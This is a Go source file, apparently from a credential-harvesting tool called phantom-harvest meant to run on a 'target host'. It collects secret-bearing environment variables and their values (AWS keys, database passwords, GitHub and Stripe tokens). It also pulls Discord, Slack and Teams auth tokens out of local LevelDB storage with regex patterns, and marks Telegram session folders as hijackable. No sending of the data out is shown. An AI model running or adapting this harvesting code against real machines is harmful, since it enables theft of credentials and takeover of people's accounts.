package harvest

import (
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
)

// scanEnvironment checks environment variables for secrets.
func (s *Scanner) scanEnvironment() {
	envSecretPatterns := []struct {
		name    string
		pattern *regexp.Regexp
	}{
		{"AWS Key", regexp.MustCompile(`(?i)^(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)$`)},
		{"API Key", regexp.MustCompile(`(?i)^(API_KEY|APIKEY|API_SECRET|APP_SECRET)$`)},
		{"Token", regexp.MustCompile(`(?i)^(TOKEN|AUTH_TOKEN|ACCESS_TOKEN|SECRET_TOKEN|BEARER_TOKEN)$`)},
		{"Password", regexp.MustCompile(`(?i)^(PASSWORD|PASSWD|DB_PASSWORD|DB_PASS|MYSQL_PASSWORD|PG_PASSWORD|PGPASSWORD|MONGO_PASSWORD|REDIS_PASSWORD)$`)},
		{"Secret", regexp.MustCompile(`(?i)^(SECRET|SECRET_KEY|APP_SECRET|DJANGO_SECRET_KEY|FLASK_SECRET_KEY|JWT_SECRET|SESSION_SECRET)$`)},
		{"Database", regexp.MustCompile(`(?i)^(DATABASE_URL|DB_URL|MYSQL_URL|POSTGRES_URL|MONGO_URL|REDIS_URL|CONNECTION_STRING)$`)},
		{"Mail", regexp.MustCompile(`(?i)^(MAIL_PASSWORD|SMTP_PASSWORD|EMAIL_PASSWORD|SENDGRID_API_KEY|MAILGUN_API_KEY)$`)},
		{"Cloud", regexp.MustCompile(`(?i)^(AZURE_CLIENT_SECRET|AZURE_TENANT_ID|GCP_SERVICE_ACCOUNT|GOOGLE_APPLICATION_CREDENTIALS)$`)},
		{"CI/CD", regexp.MustCompile(`(?i)^(GITHUB_TOKEN|GITLAB_TOKEN|CIRCLE_TOKEN|TRAVIS_TOKEN|JENKINS_TOKEN|NPM_TOKEN)$`)},
		{"Stripe", regexp.MustCompile(`(?i)^(STRIPE_SECRET_KEY|STRIPE_API_KEY)$`)},
		{"Slack", regexp.MustCompile(`(?i)^(SLACK_TOKEN|SLACK_BOT_TOKEN|SLACK_WEBHOOK)$`)},
		{"Private Key", regexp.MustCompile(`(?i)^(PRIVATE_KEY|SSL_KEY|TLS_KEY)$`)},
	}

	// Skip env vars set by the tool's runner (CI/CD systems running phantom-harvest itself).
	// These would create noisy false positives that aren't credentials from the target host.
	skipEnvPrefixes := []string{
		"GITHUB_", "GITLAB_", "CI", "CI_", "JENKINS_", "RUNNER_",
		"BUILDKITE_", "BUILD_", "AGENT_", "TF_BUILD", "BITRISE_",
	}

	for _, env := range os.Environ() {
		parts := strings.SplitN(env, "=", 2)
		if len(parts) != 2 || parts[1] == "" {
			continue
		}
		key := parts[0]
		value := parts[1]

		skip := false
		for _, prefix := range skipEnvPrefixes {
			if key == strings.TrimSuffix(prefix, "_") || strings.HasPrefix(key, prefix) {
				skip = true
				break
			}
		}
		if skip {
			continue
		}

		for _, p := range envSecretPatterns {
			if p.pattern.MatchString(key) {
				s.addFinding(Finding{
					Category:   "Environment",
					Type:       "env_variable",
					File:       "ENV:" + key,
					Key:        key,
					Value:      truncate(value, 80),
					Confidence: ConfHigh,
				})
				break
			}
		}

		// Also check values for known secret patterns
		if strings.HasPrefix(value, "AKIA") && len(value) == 20 {
			s.addFinding(Finding{
				Category:   "Environment",
				Type:       "aws_key_in_env",
				File:       "ENV:" + key,
				Key:        key,
				Value:      value,
				Confidence: ConfHigh,
			})
		}
		if strings.HasPrefix(value, "ghp_") || strings.HasPrefix(value, "gho_") {
			s.addFinding(Finding{
				Category:   "Environment",
				Type:       "github_token_in_env",
				File:       "ENV:" + key,
				Key:        key,
				Value:      truncate(value, 40),
				Confidence: ConfHigh,
			})
		}
		if strings.HasPrefix(value, "sk_live_") {
			s.addFinding(Finding{
				Category:   "Environment",
				Type:       "stripe_key_in_env",
				File:       "ENV:" + key,
				Key:        key,
				Value:      truncate(value, 40),
				Confidence: ConfHigh,
			})
		}
	}
}

// scanAppTokens finds Slack, Discord, and Teams local tokens.
func (s *Scanner) scanAppTokens() {
	homes := findHomeDirs(s.root)

	for _, home := range homes {
		// Discord tokens (stored in LevelDB)
		discordPaths := []string{
			"AppData/Roaming/discord/Local Storage/leveldb",
			"AppData/Roaming/discordcanary/Local Storage/leveldb",
			"AppData/Roaming/discordptb/Local Storage/leveldb",
			".config/discord/Local Storage/leveldb",
		}
		for _, p := range discordPaths {
			dbDir := filepath.Join(home, p)
			if info, err := os.Stat(dbDir); err == nil && info.IsDir() {
				// Scan .ldb and .log files for token patterns
				s.scanLevelDBForTokens(dbDir, "Discord")
			}
		}

		// Slack tokens
		slackPaths := []string{
			"AppData/Roaming/Slack/Local Storage/leveldb",
			"AppData/Roaming/Slack/storage",
			".config/Slack/Local Storage/leveldb",
		}
		for _, p := range slackPaths {
			dbDir := filepath.Join(home, p)
			if info, err := os.Stat(dbDir); err == nil && info.IsDir() {
				s.scanLevelDBForTokens(dbDir, "Slack")
			}
		}

		// Teams tokens
		if runtime.GOOS == "windows" {
			teamsPaths := []string{
				"AppData/Roaming/Microsoft/Teams/Local Storage/leveldb",
				"AppData/Local/Packages/MicrosoftTeams_8wekyb3d8bbwe/LocalCache/Microsoft/MSTeams/EBWebView/Default/Local Storage/leveldb",
			}
			for _, p := range teamsPaths {
				dbDir := filepath.Join(home, p)
				if info, err := os.Stat(dbDir); err == nil && info.IsDir() {
					s.scanLevelDBForTokens(dbDir, "Teams")
				}
			}
		}

		// Telegram session files
		telegramPaths := []string{
			"AppData/Roaming/Telegram Desktop/tdata",
			".local/share/TelegramDesktop/tdata",
		}
		for _, p := range telegramPaths {
			tDir := filepath.Join(home, p)
			if info, err := os.Stat(tDir); err == nil && info.IsDir() {
				s.addFinding(Finding{
					Category:   "App Token",
					Type:       "telegram_session",
					File:       tDir,
					Key:        "Telegram Session Data",
					Value:      "(tdata directory — can hijack session)",
					Confidence: ConfHigh,
				})
			}
		}
	}
}

// scanLevelDBForTokens searches LevelDB files for authentication tokens.
func (s *Scanner) scanLevelDBForTokens(dir, appName string) {
	tokenPatterns := []*regexp.Regexp{
		// Discord tokens
		regexp.MustCompile(`[\w-]{24}\.[\w-]{6}\.[\w-]{27}`),
		regexp.MustCompile(`mfa\.[\w-]{84}`),
		// Slack tokens
		regexp.MustCompile(`xox[baprs]-[A-Za-z0-9\-]{10,}`),
	}

	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}

	foundTokens := make(map[string]bool)

	for _, entry := range entries {
		ext := strings.ToLower(filepath.Ext(entry.Name()))
		if ext != ".ldb" && ext != ".log" {
			continue
		}

		data, err := os.ReadFile(filepath.Join(dir, entry.Name()))
		if err != nil || len(data) > 10*1024*1024 {
			continue
		}

		for _, pattern := range tokenPatterns {
			matches := pattern.FindAllString(string(data), 5)
			for _, match := range matches {
				if !foundTokens[match] {
					foundTokens[match] = true
					s.addFinding(Finding{
						Category:   "App Token",
						Type:       strings.ToLower(appName) + "_token",
						File:       filepath.Join(dir, entry.Name()),
						Key:        appName + " Token",
						Value:      truncate(match, 60),
						Confidence: ConfHigh,
					})
				}
			}
		}
	}

	// If no tokens found but directory exists, still report it
	if len(foundTokens) == 0 {
		s.addFinding(Finding{
			Category:   "App Token",
			Type:       strings.ToLower(appName) + "_storage",
			File:       dir,
			Key:        appName + " Local Storage",
			Value:      "(LevelDB — may contain auth tokens)",
			Confidence: ConfMedium,
		})
	}
}
